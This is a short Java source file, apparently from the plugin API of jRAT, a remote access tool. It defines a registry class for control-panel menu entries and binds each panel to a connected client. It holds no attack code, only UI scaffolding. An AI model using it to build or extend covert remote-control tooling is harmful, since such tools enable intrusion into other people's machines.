package jrat.api.ui;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.swing.ImageIcon;

import jrat.api.BaseControlPanel;
import jrat.api.Client;

public final class RATControlMenuEntry {
	
	private static final List<RATControlMenuEntry> ENTRIES = new ArrayList<RATControlMenuEntry>();

	private String name;
	private Class<? extends BaseControlPanel> panel;
	private ImageIcon icon;

	/**
	 * Instances of this panel with a Client
	 */
	private final Map<Object, BaseControlPanel> instances = new HashMap<Object, BaseControlPanel>();

	public static void addEntry(RATControlMenuEntry e) {
		ENTRIES.add(e);
	}
	
	public static void removeEntry(RATControlMenuEntry e) {
		ENTRIES.remove(e);
	}
	
	public static List<RATControlMenuEntry> getEntries() {
		return ENTRIES;
	}
	
	public RATControlMenuEntry(String name, Class<? extends BaseControlPanel> panel) {
		this(name, null, panel);
	}

	public RATControlMenuEntry(String name, ImageIcon icon, Class<? extends BaseControlPanel> panel) {
		this.name = name;
		this.panel = panel;
		this.icon = icon;
	}
	
	public Map<Object, BaseControlPanel> getInstances() {
		return instances;
	}

	/**
	 * 
	 * @return Returns the icon
	 */

	public ImageIcon getIcon() {
		return icon;
	}

	/**
	 * 
	 * @return Returns the name
	 */

	public String getName() {
		return name;
	}

	/**
	 * 
	 * @return Returns the class of the panel
	 */

	public Class<? extends BaseControlPanel> getPanel() {
		return panel;
	}

	/**
	 * 
	 * @param server
	 * @return Returns a new instance of the panel with the specified server as
	 *         server
	 * @throws Exception
	 */

	public BaseControlPanel newPanelInstance(Client server) throws Exception {
		BaseControlPanel p = panel.newInstance();
		p.setServer(server);
		return p;
	}

}
